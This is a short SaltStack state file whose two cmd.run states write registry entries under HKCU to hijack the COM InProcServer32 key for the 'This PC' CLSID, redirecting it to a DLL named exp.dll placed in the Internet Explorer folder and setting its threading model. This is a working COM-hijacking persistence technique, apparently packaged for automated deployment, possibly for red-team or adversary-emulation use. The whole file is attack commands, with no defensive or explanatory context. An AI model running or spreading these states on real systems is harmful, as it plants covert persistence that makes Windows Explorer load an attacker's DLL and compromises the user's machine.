com_hijack_default:
  cmd.run:
    - name: reg add "HKCU\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32" /ve /t REG_SZ /d "C:\Program Files (x86)\Internet Explorer\exp.dll" /f

com_hijack_threading:
  cmd.run:
    - name: reg add "HKCU\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
    - require:
      - cmd: com_hijack_default

